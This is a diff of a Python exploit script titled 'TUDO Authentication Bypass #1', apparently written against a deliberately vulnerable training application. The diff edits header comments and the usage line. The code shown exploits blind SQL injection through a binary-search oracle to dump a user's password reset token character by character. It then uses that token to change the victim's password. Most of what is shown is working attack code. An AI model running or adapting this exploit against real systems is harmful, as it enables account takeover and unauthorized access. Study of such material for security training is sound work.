@@ -1,14 +1,14 @@
 #!/usr/bin/python3
 
-# Dump the password reset token for a given user id,
-# by abusing the blind sqli vulnerability in
-# 'forgotusername.php'
+# @title TUDO Authentication Bypass #1
+# @author William Moody
+# @date 09.03.2021
 
 import requests
 import sys
 
 if len(sys.argv) != 5:
-	print('usage: %s TARGET USERNAME UID NEWPASSWORD' % sys.argv[0])
+	print('usage: %s TargetIP Username Uid NewPassword' % sys.argv[0])
 	sys.exit(-1)
 
 target   = sys.argv[1]
@@ -57,16 +57,14 @@ for i in range(1,33):
 	mid = 0
 	while not Found and low <= high:
 		mid = (high+low)//2
-	
 		if oracle(sql_template%(i,uid),'>',"'%d"%mid):
 			low = mid+1
-	
 		elif oracle(sql_template%(i,uid),'<',"'%d"%mid):
 			high = mid-1
-	
 		else:
 			dumped += chr(mid)
 			Found = True
+
 print("[+] Token dumped.")
 
 if change_password(dumped):
